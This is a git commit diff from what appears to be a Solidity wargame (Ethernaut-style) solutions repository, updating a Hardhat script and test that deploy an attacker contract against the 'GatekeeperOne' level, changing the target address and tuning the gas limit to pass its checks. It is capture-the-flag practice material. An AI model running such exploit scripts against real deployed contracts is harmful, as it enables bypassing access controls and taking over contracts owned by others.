0055f09f061b987b79c1333dbbb48cd173eb0139
0xK3K <0xk3k@protonmail.com>
2022-12-22 16:52:30 +0700

    Gatekeeper One

--- scripts/gatekeeper-one.ts
+++ scripts/gatekeeper-one.ts
@@ -1,12 +1,12 @@
 import { ethers } from "hardhat";
 
 async function main() {
-  const gatekeeperOne = await ethers.getContractAt("GatekeeperOne", "0x57594376615dFF81Ea9A575be74f7b25Abe76086");
+  const gatekeeperOne = await ethers.getContractAt("GatekeeperOne", "0x924Ad48FCD74EA841F40123cac6479E21A5BAdc1");
 
   const GatekeeperOneAttacker = await ethers.getContractFactory("GatekeeperOneAttacker");
   const gatekeeperOneAttacker = await GatekeeperOneAttacker.deploy(gatekeeperOne.address);
 
-  const tx = await gatekeeperOneAttacker.attack({ gasLimit: 51765 });
+  const tx = await gatekeeperOneAttacker.attack({ gasLimit: 51596 });
   await tx.wait(1);
 
   console.log("done!");
--- tests/gatekeeper-one.test.ts
+++ tests/gatekeeper-one.test.ts
@@ -4,14 +4,13 @@ import { expect } from "chai";
 describe("Attack", () => {
 	it("Should work", async () => {
 		const [, attacker] = await ethers.getSigners();
-		const GatekeeperOne = await ethers.getContractFactory("GatekeeperOne");
-		const gatekeeperOne = await GatekeeperOne.deploy();
+		const gatekeeperOne = await ethers.getContractAt("GatekeeperOne", "0x924Ad48FCD74EA841F40123cac6479E21A5BAdc1");
 
 		const GatekeeperOneAttacker = await ethers.getContractFactory("GatekeeperOneAttacker");
 		const gatekeeperOneAttacker = await GatekeeperOneAttacker.connect(attacker).deploy(gatekeeperOne.address);
 
 		// brute force the shit out of this value
-		await gatekeeperOneAttacker.connect(attacker).attack({ gasLimit: 51765 });
+		await gatekeeperOneAttacker.connect(attacker).attack({ gasLimit: 51596 });
 
 		expect(await gatekeeperOne.entrant()).to.eq(attacker.address);
 	})
